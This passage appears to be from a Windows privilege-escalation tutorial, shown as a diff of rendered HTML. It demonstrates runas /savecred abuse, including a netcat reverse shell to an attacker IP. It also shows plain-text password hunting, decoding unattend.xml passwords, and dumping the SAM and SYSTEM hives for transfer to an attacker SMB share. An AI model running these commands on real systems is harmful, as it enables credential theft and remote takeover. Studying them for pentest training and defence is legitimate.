+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">High</span> <span class="na">Mandatory</span> <span class="n">Level</span>                          <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">12288</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We could also try to execute commands as the Administrator user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">admin</span> <span class="s2">&#34;C:\windows\system32\cmd.exe /c dir /b /a /s C:\Users\Administrator &gt; C:\Tools\admin.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="nb">start </span><span class="n">C:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">dir </span><span class="p">/</span><span class="n">b</span> <span class="p">/</span><span class="n">a</span> <span class="p">/</span><span class="n">s</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">admin</span><span class="p">.</span><span class="py">txt</span> <span class="n">as</span> <span class="n">user</span> <span class="s2">&#34;desktop-bn\admin&#34;</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">admin</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">AppData</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Application</span> <span class="n">Data</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The following example is calling a remote binary via an SMB share.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">admin</span> <span class="s2">&#34;\\10.XXX.XXX.XXX\SHARE\evil.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>runas</code> with a provided set of credentials we can try a executing reverse shell as Administrator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">admin</span> <span class="s2">&#34;C:\Tools\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="extracting-credentials-from-the-credential-manager">Extracting Credentials from the Credential Manager</h3>
+<p>Tools such as <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreffer ">mimikatz</a>, <a href="https://www.nirsoft.net/utils/credentials_file_view.html" target="_blank" rel="noopener noreffer ">credentialfileview</a>, <a href="https://www.nirsoft.net/utils/vault_password_view.html" target="_blank" rel="noopener noreffer ">VaultPasswordView</a>, and <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1" target="_blank" rel="noopener noreffer ">Empire Powershells module</a> can help you extract credentials from the Windows Credential Manager.</p>
+<p>This section covers the following escalation paths:</p>
+<ul>
+<li>Non-Admin Medium Integrity Level (No Password) -&gt; Non-Admin Medium Integrity Level Password</li>
+<li>Admin Medium Integrity Level (No Password) -&gt; Admin Medium Integrity Level Password</li>
+</ul>
+<h2 id="plain-text-credentials">Plain-Text Credentials</h2>
+<p>Add a simple plain-text file containing a password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="s1">&#39;Administrator con123&#39;</span> <span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then from an attacker&rsquo;s perspective, let&rsquo;s search all the files in the <code>C:\</code> drive:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">dir </span><span class="p">/</span><span class="n">b</span> <span class="p">/</span><span class="n">a</span> <span class="p">/</span><span class="n">s</span> <span class="n">C:</span><span class="p">\</span> <span class="p">&gt;</span> <span class="n">cdirs</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The command above has the following attributes:</p>
+<ul>
+<li>/b: Uses bare format (no heading information or summary).</li>
+<li>/a: Displays files with specified attributes.</li>
+<li>/s: Displays files in specified directory and all subdirectories.</li>
+</ul>
+<p>Filter for files containing the following string (passw):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">cdirs</span><span class="p">.</span><span class="py">txt</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">passw</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We found a clear-text password filename:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">Administrator</span> <span class="n">con123</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We should also try to enumerate network shares or other disk mounts:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="answer-files-unattendedxml">Answer Files (Unattend/ed.xml)</h3>
+<p>According to the <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11" target="_blank" rel="noopener noreffer ">official documentation</a>, the answer files are described as:</p>
+<blockquote>
+<p>Answer files (or Unattend files) can be used to modify Windows settings in your images during Setup. You can also create settings that trigger scripts in your images that run after the first user creates their account and picks their default language.</p>
+</blockquote>
+<p>Another important detail is the following:</p>
+<blockquote>
+<p>Windows Setup will automatically search for <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview?view=windows-11#implicit-answer-file-search-order" target="_blank" rel="noopener noreffer ">answer files in certain locations</a>, or you can specify an unattend file to use by using the <code>/unattend:</code> option when <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-command-line-options?view=windows-11#unattend" target="_blank" rel="noopener noreffer ">running Windows Setup (setup.exe)</a>.</p>
+</blockquote>
+<p>As stated above, the answer files can be written in different locations, here is a general template that we can use:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="py">inf</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="py">inf</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattended</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">\</span><span class="n">Unattend</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">\</span><span class="n">Unattended</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">Sysprep</span><span class="p">\</span><span class="n">unattend</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">Sysprep</span><span class="p">\</span><span class="n">unattended</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">unattend</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">unattend</span><span class="p">.</span><span class="py">inf</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">*</span><span class="n">sysprep</span><span class="p">.</span><span class="py">inf</span> <span class="p">*</span><span class="n">sysprep</span><span class="p">.</span><span class="py">xml</span> <span class="p">*</span><span class="n">unattended</span><span class="p">.</span><span class="py">xml</span> <span class="p">*</span><span class="n">unattend</span><span class="p">.</span><span class="py">xml</span> <span class="p">*</span><span class="n">unattend</span><span class="p">.</span><span class="py">txt</span> <span class="mf">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is an example of the content of an <code>Unattended.xml</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">&#34;Microsoft-Windows-Shell-Setup&#34;</span> <span class="na">publicKeyToken=</span><span class="s">&#34;31bf3856ad364e35&#34;</span> <span class="na">language=</span><span class="s">&#34;neutral&#34;</span> <span class="na">versionScope=</span><span class="s">&#34;nonSxS&#34;</span> <span class="na">processorArchitecture=</span><span class="s">&#34;amd64&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AutoLogon&gt;</span>
+</span></span><span class="line"><span class="cl">     <span class="nt">&lt;Password&gt;</span>Uxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="nt">&lt;/Password&gt;</span>
+</span></span><span class="line"><span class="cl">     <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
+</span></span><span class="line"><span class="cl">     <span class="nt">&lt;Username&gt;</span>Administrateur<span class="nt">&lt;/Username&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/AutoLogon&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;UserAccounts&gt;</span>
+</span></span><span class="line"><span class="cl">     <span class="nt">&lt;LocalAccounts&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;LocalAccount</span> <span class="na">wcm:action=</span><span class="s">&#34;add&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="nt">&lt;Password&gt;</span>*SENSITIVE*DATA*DELETED*<span class="nt">&lt;/Password&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="nt">&lt;Group&gt;</span>administrators;users<span class="nt">&lt;/Group&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="nt">&lt;Name&gt;</span>Administrateur<span class="nt">&lt;/Name&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/LocalAccount&gt;</span>
+</span></span><span class="line"><span class="cl">     <span class="nt">&lt;/LocalAccounts&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/UserAccounts&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Noticed that there is a password field:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Password&gt;</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="nt">&lt;/Password&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can decode this base64 string and gather the password in plain text:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;</span> <span class="p">|</span> base64 -d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I won&rsquo;t recreate a scenario of this since this happens during the Windows Setup.</p>
+<h2 id="sam--system-backups">SAM &amp; SYSTEM Backups</h2>
+<p>The SAM and SYSTEM backups are usually stored in the following locations:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\S</span>AM
+</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\S</span>AM
+</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>AM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM
+</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\s</span>ystem
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;re gonna create a backup of the SAM and SYSTEM files; to do this we must run it from an <strong>administrator</strong> command prompt or PowerShell console:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">c:</span><span class="p">\</span><span class="n">sam</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c:</span><span class="p">\</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s verify if we have access to these files as a low-privileged user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">icacls</span> <span class="n">C:</span><span class="p">\</span><span class="n">sam</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">sam</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">High</span> <span class="na">Mandatory</span> <span class="n">Level</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">NW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">icacls</span> <span class="n">C:</span><span class="p">\</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">system</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">High</span> <span class="na">Mandatory</span> <span class="n">Level</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">NW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We do have access as we can see in this line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">M</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see we&rsquo;re part of this group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">authenticated</span>
+</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setup an SMB share with credentials on your host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo impacket-smbserver share . -smb2support -username low -password <span class="s1">&#39;p@ssw0rd&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
+</span></span><span class="line"><span class="cl">Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Transfer the SAM and SYSTEM files to your attacker VM:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
